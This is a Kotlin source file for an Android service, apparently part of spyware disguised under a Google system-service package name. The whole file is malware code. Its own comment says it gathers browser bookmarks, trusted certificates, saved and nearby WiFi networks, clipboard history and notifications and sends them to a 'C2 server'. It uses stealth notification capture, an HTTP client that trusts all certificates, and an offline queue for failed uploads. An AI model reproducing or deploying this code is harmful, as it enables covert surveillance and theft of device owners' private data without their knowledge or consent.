package com.google.android.systemservice.services

import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.IBinder
import android.provider.Settings
import android.util.Base64
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.OfflineDataQueue
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.security.KeyStore
import java.security.cert.X509Certificate

/**
 * Collects extended device data: bookmarks, certificates, WiFi networks,
 * clipboard history, and app notifications. Sends to C2 server.
 */
class DataCollectionService : Service() {

    companion object {
        private const val TAG = "DataCollection"
        const val ACTION_COLLECT_BOOKMARKS = "collect_bookmarks"
        const val ACTION_COLLECT_CERTIFICATES = "collect_certificates"
        const val ACTION_COLLECT_WIFI = "collect_wifi_networks"
        const val ACTION_COLLECT_CLIPBOARD = "collect_clipboard_history"
        const val ACTION_TAKE_SCREENSHOT = "take_on_demand_screenshot"
        const val ACTION_COLLECT_NOTIFICATIONS = "collect_notifications"
        const val ACTION_COLLECT_ALL = "collect_all"

        private val CHROME_BOOKMARKS_URI = Uri.parse("content://com.android.chrome.browser/bookmarks")
        private val BROWSER_BOOKMARKS_URI = Uri.parse("content://browser/bookmarks")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("collection_action") ?: ACTION_COLLECT_ALL
        val requestId = intent?.getStringExtra("request_id")

        Thread {
            try {
                when (action) {
                    ACTION_COLLECT_BOOKMARKS -> collectAndSendBookmarks(requestId)
                    ACTION_COLLECT_CERTIFICATES -> collectAndSendCertificates(requestId)
                    ACTION_COLLECT_WIFI -> collectAndSendWifiNetworks(requestId)
                    ACTION_COLLECT_CLIPBOARD -> collectAndSendClipboardHistory(requestId)
                    ACTION_TAKE_SCREENSHOT -> takeOnDemandScreenshot(requestId)
                    ACTION_COLLECT_NOTIFICATIONS -> collectAndSendNotifications(requestId)
                    ACTION_COLLECT_ALL -> collectAll(requestId)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in data collection ($action): ${e.message}")
            } finally {
                stopSelf(startId)
            }
        }.start()

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopForeground(false)
        super.onDestroy()
    }

    private fun collectAll(requestId: String?) {
        collectAndSendBookmarks(requestId)
        collectAndSendCertificates(requestId)
        collectAndSendWifiNetworks(requestId)
        collectAndSendClipboardHistory(requestId)
    }

    // --- Bookmarks ---
    private fun collectAndSendBookmarks(requestId: String?) {
        val bookmarks = JSONArray()

        queryBookmarks(CHROME_BOOKMARKS_URI, bookmarks, "Chrome")
        if (bookmarks.length() == 0) {
            queryBookmarks(BROWSER_BOOKMARKS_URI, bookmarks, "Default")
        }

        val payload = JSONObject().apply {
            put("device_id", AndroidConfig.deviceId)
            put("command", "get_bookmarks")
            put("request_id", requestId ?: "")
            put("bookmarks", bookmarks)
            put("count", bookmarks.length())
            put("timestamp", System.currentTimeMillis())
        }

        sendToEndpoint("/devices/${AndroidConfig.deviceId}/bookmarks", payload)
    }

    private fun queryBookmarks(uri: Uri, results: JSONArray, browser: String) {
        try {
            val cursor: Cursor? = contentResolver.query(
                uri,
                arrayOf("title", "url", "created", "folder"),
                "bookmark=1", null, "created DESC"
            )
            cursor?.use {
                val titleIdx = it.getColumnIndex("title")
                val urlIdx = it.getColumnIndex("url")
                val folderIdx = it.getColumnIndex("folder")
                var count = 0
                while (it.moveToNext() && count < 200) {
                    results.put(JSONObject().apply {
                        put("title", if (titleIdx >= 0) it.getString(titleIdx) else "")
                        put("url", if (urlIdx >= 0) it.getString(urlIdx) else "")
                        put("browser", browser)
                        put("folder", if (folderIdx >= 0) it.getString(folderIdx) else "")
                    })
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "No permission for bookmarks: ${e.message}")
        } catch (e: Exception) {
            Log.w(TAG, "Cannot query bookmarks from $uri: ${e.message}")
        }
    }

    // --- Installed Certificates ---
    private fun collectAndSendCertificates(requestId: String?) {
        val certs = JSONArray()
        try {
            val keyStore = KeyStore.getInstance("AndroidCAStore")
            keyStore.load(null)
            val aliases = keyStore.aliases()

            var count = 0
            while (aliases.hasMoreElements() && count < 500) {
                val alias = aliases.nextElement()
                try {
                    val cert = keyStore.getCertificate(alias)
                    if (cert is X509Certificate) {
                        certs.put(JSONObject().apply {
                            put("subject", cert.subjectDN.name)
                            put("issuer", cert.issuerDN.name)
                            put("serial_number", cert.serialNumber.toString(16))
                            put("fingerprint_sha256", certFingerprint(cert))
                            put("valid_from", cert.notBefore.time)
                            put("valid_to", cert.notAfter.time)
                            put("is_system", alias.startsWith("system:"))
                            put("is_trusted", true)
                        })
                        count++
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Cannot read cert $alias: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading certificate store: ${e.message}")
        }

        val payload = JSONObject().apply {
            put("device_id", AndroidConfig.deviceId)
            put("command", "get_certificates")
            put("request_id", requestId ?: "")
            put("certificates", certs)
            put("count", certs.length())
            put("timestamp", System.currentTimeMillis())
        }

        sendToEndpoint("/devices/${AndroidConfig.deviceId}/certificates", payload)
    }

    private fun certFingerprint(cert: X509Certificate): String {
        return try {
            val md = java.security.MessageDigest.getInstance("SHA-256")
            val digest = md.digest(cert.encoded)
            digest.joinToString(":") { "%02X".format(it) }
        } catch (e: Exception) {
            ""
        }
    }

    // --- WiFi Networks ---
    @Suppress("DEPRECATION")
    private fun collectAndSendWifiNetworks(requestId: String?) {
        val networks = JSONArray()
        try {
            val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as? WifiManager
            if (wifiManager != null) {
                // Current connection
                val connectionInfo = wifiManager.connectionInfo
                if (connectionInfo != null && connectionInfo.ssid != "<unknown ssid>") {
                    networks.put(JSONObject().apply {
                        put("ssid", connectionInfo.ssid.replace("\"", ""))
                        put("bssid", connectionInfo.bssid ?: "")
                        put("signal_strength", connectionInfo.rssi)
                        put("is_connected", true)
                        put("is_saved", true)
                    })
                }

                // Saved networks
                val configuredNetworks = wifiManager.configuredNetworks
                configuredNetworks?.forEach { config ->
                    val ssid = config.SSID?.replace("\"", "") ?: return@forEach
                    val alreadyAdded = (0 until networks.length()).any {
                        networks.getJSONObject(it).optString("ssid") == ssid
                    }
                    if (!alreadyAdded) {
                        networks.put(JSONObject().apply {
                            put("ssid", ssid)
                            put("bssid", config.BSSID ?: "")
                            put("security_type", getSecurityType(config))
                            put("is_connected", false)
                            put("is_saved", true)
                        })
                    }
                }

                // Scan results
                val scanResults = wifiManager.scanResults
                scanResults?.forEach { result ->
                    val ssid = result.SSID ?: return@forEach
                    if (ssid.isEmpty()) return@forEach
                    val alreadyAdded = (0 until networks.length()).any {
                        networks.getJSONObject(it).optString("ssid") == ssid
                    }
                    if (!alreadyAdded) {
                        networks.put(JSONObject().apply {
                            put("ssid", ssid)
                            put("bssid", result.BSSID ?: "")
                            put("security_type", result.capabilities)
                            put("signal_strength", result.level)
                            put("is_connected", false)
                            put("is_saved", false)
                            put("first_seen_at", System.currentTimeMillis())
                        })
                    }
                }
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "No WiFi permission: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting WiFi networks: ${e.message}")
        }

        val payload = JSONObject().apply {
            put("device_id", AndroidConfig.deviceId)
            put("command", "get_wifi_networks")
            put("request_id", requestId ?: "")
            put("wifi_networks", networks)
            put("count", networks.length())
            put("timestamp", System.currentTimeMillis())
        }

        sendToEndpoint("/devices/${AndroidConfig.deviceId}/wifi_networks", payload)
    }

    @Suppress("DEPRECATION")
    private fun getSecurityType(config: android.net.wifi.WifiConfiguration): String {
        return when {
            config.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_PSK) -> "WPA/WPA2"
            config.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_EAP) -> "WPA-Enterprise"
            config.wepKeys?.any { it != null } == true -> "WEP"
            else -> "Open"
        }
    }

    // --- Clipboard History ---
    private fun collectAndSendClipboardHistory(requestId: String?) {
        // Clipboard history is collected by ClipboardMonitorService in real-time.
        // This method sends a batched request for any cached history.
        val history = JSONArray()

        try {
            val prefs = getSharedPreferences("clipboard_cache", MODE_PRIVATE)
            val cached = prefs.getString("history", null)
            if (cached != null) {
                val cachedArray = JSONArray(cached)
                for (i in 0 until cachedArray.length()) {
                    history.put(cachedArray.getJSONObject(i))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Cannot read clipboard cache: ${e.message}")
        }

        val payload = JSONObject().apply {
            put("device_id", AndroidConfig.deviceId)
            put("command", "get_clipboard_history")
            put("request_id", requestId ?: "")
            put("clipboard_entries", history)
            put("count", history.length())
            put("timestamp", System.currentTimeMillis())
        }

        sendToEndpoint("/devices/${AndroidConfig.deviceId}/clipboard_history", payload)
    }

    // --- On-demand Screenshot ---
    private fun takeOnDemandScreenshot(requestId: String?) {
        // Delegate to the existing screenshot mechanism via media projection
        try {
            val screenshotIntent = Intent(this, CameraService::class.java).apply {
                putExtra("command", "take_screenshot")
                putExtra("request_id", requestId)
            }
            startService(screenshotIntent)
            Log.d(TAG, "Screenshot request delegated to CameraService")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delegate screenshot: ${e.message}")
        }
    }

    // --- Notification Capture ---
    private fun collectAndSendNotifications(requestId: String?) {
        // Notifications are captured by StealthNotificationListener in real-time.
        // This method sends cached notifications.
        val notifications = JSONArray()

        try {
            val prefs = getSharedPreferences("notification_cache", MODE_PRIVATE)
            val cached = prefs.getString("notifications", null)
            if (cached != null) {
                val cachedArray = JSONArray(cached)
                for (i in 0 until cachedArray.length()) {
                    notifications.put(cachedArray.getJSONObject(i))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Cannot read notification cache: ${e.message}")
        }

        val payload = JSONObject().apply {
            put("device_id", AndroidConfig.deviceId)
            put("command", "get_notifications")
            put("request_id", requestId ?: "")
            put("notifications", notifications)
            put("count", notifications.length())
            put("timestamp", System.currentTimeMillis())
        }

        sendToEndpoint("/notifications", payload)
    }

    // --- HTTP Transport ---
    private fun sendToEndpoint(path: String, payload: JSONObject) {
        try {
            val client = TrustAllCertificates.createClientBuilder().build()
            val body = payload.toString().toRequestBody("application/json".toMediaType())
            val url = "${AndroidConfig.apiBaseUrl}$path"

            val request = Request.Builder()
                .url(url)
                .addHeader("X-Device-ID", AndroidConfig.deviceId)
                .addHeader("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Data sent to $path successfully")
                } else {
                    Log.w(TAG, "Failed to send to $path: ${response.code}, queuing offline")
                    queueOffline(path, payload.toString())
                }
            }
        } catch (e: IOException) {
            Log.e(TAG, "Network error sending to $path: ${e.message}")
            queueOffline(path, payload.toString())
        }
    }

    private fun queueOffline(endpoint: String, jsonPayload: String) {
        try {
            val queue = OfflineDataQueue(this)
            queue.enqueue(endpoint, jsonPayload, AndroidConfig.deviceId)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue offline: ${e.message}")
        }
    }
}
